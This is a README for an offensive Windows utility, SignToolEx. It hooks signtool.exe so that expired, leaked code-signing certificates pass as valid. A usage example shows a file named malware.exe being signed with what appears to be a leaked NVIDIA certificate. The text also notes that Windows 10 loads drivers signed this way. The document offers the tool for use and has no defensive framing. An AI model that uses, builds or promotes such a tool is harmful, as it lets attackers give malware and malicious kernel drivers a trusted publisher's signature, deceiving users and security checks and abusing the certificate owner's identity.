# SignToolEx

SignToolEx uses Microsoft Detours hooking library to hijack "signtool.exe" and modify
expired code-signing certificates to appear valid, allowing to codesign without changing
system clock. This allows expired (leaked) certificates to be used for code-signing but
does not permit spoofing Authenticode timestamps. Some versions of Windows (such as 10)
accept and load .sys device drivers when signed with expired certificates regardless. 

This tool is used in the same way as "signtool.exe" by simply running "SignToolEx.exe",
needs SignToolExHook.dll in the current directory and "signtool.exe" in your %PATH%.

```
C:\tools\SignToolEx>SignToolEx.exe sign /v /f nvidia0.pfx /p **redacted** /fd SHA256 c:\temp\malware.exe
The following certificate was selected:
    Issued to: NVIDIA Corporation
    Issued by: VeriSign Class 3 Code Signing 2010 CA
    Expires:   Sat Jul 26 17:59:59 3000
    SHA1 hash: 30632EA310114105969D0BDA28FDCE267104754F

Done Adding Additional Store
Successfully signed: c:\temp\malware.exe

Number of files successfully Signed: 1
Number of warnings: 0
Number of errors: 0

```

These files are available under a Attribution-NonCommercial-NoDerivatives 4.0 International license.